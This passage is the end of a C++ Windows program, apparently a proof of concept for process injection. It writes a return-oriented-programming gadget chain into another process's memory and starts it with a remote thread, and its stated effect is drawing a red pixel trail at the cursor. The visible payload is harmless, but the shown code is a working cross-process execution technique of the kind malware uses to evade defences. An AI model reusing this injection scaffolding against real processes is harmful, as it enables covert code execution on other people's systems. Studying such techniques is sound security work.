        gadget_mov_mem_rax_rax_ret,  //[28] rax = [save_rcx_store]
        gadget_mov_rcx_rax_ret,      //[29] rcx = rax  (restore hDC)
        gadget_pop_rax_ret,          //[30] rax = &save_rdx_store
        save_rdx_store,              //[31]
        gadget_mov_mem_rax_rax_ret,  //[32] rax = [save_rdx_store]
        gadget_mov_rdx_rax_ret,      //[33] rdx = rax  (restore X)
        gadget_pop_rsp_ret,          //[34] RSP → mainRop_lineToPin → ret = mainRopChain[35]
        mainRop_lineToPin,           //[35] (value = mainRopBase + 35*8)
    };

    size_t ropSubChainSize = sizeof(ropSubChain);
    WriteProcessMemory(hProcess, (LPVOID)subRopBase, ropSubChain, ropSubChainSize, nullptr);
    std::cout << "[+] Sub ROP chain written to region E (" << std::dec << ropSubChainSize << " bytes)" << std::endl;

    // --- 10. Start remote thread (entry gadget; lpParameter = mainRopBase) ---
    DWORD tid;
    HANDLE hRemoteThread = CreateRemoteThread(
        hProcess,
        nullptr,
        0,
        (LPTHREAD_START_ROUTINE)gadget_entry,
        (LPVOID)mainRopBase,
        0,
        &tid
    );
    if (!hRemoteThread)
    {
        std::cout << "[!] CreateRemoteThread failed. Err:" << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, pMainRopBlock, 0, MEM_RELEASE);
        VirtualFreeEx(hProcess, pCursorPosStack, 0, MEM_RELEASE);
        VirtualFreeEx(hProcess, pGetDCStack, 0, MEM_RELEASE);
        VirtualFreeEx(hProcess, pSetPixelStack, 0, MEM_RELEASE);
        VirtualFreeEx(hProcess, pDelayStack, 0, MEM_RELEASE);
        VirtualFreeEx(hProcess, pSubRopBlock, 0, MEM_RELEASE);
        VirtualFreeEx(hProcess, pLineToStack, 0, MEM_RELEASE);
        FreeLibrary(hUser32);
        FreeLibrary(hGdi32);
        FreeLibrary(hKernel32Local);
        FreeLibrary(hWin32u);
        CloseHandle(hProcess);
        return -1;
    }
    std::cout << "[+] Remote thread created, tid: " << tid << std::endl;
    std::cout << "[*] ROP running (red pixel trail at cursor)..." << std::endl;
    WaitForSingleObject(hRemoteThread, INFINITE);
    std::cout << "[+] Remote thread finished." << std::endl;

    CloseHandle(hRemoteThread);
    VirtualFreeEx(hProcess, pMainRopBlock, 0, MEM_RELEASE);
    VirtualFreeEx(hProcess, pCursorPosStack, 0, MEM_RELEASE);
    VirtualFreeEx(hProcess, pGetDCStack, 0, MEM_RELEASE);
    VirtualFreeEx(hProcess, pSetPixelStack, 0, MEM_RELEASE);
    VirtualFreeEx(hProcess, pDelayStack, 0, MEM_RELEASE);
    VirtualFreeEx(hProcess, pSubRopBlock, 0, MEM_RELEASE);
    VirtualFreeEx(hProcess, pLineToStack, 0, MEM_RELEASE);
    FreeLibrary(hUser32);
    FreeLibrary(hGdi32);
    FreeLibrary(hKernel32Local);
    FreeLibrary(hWin32u);
    CloseHandle(hProcess);
    return 0;
}
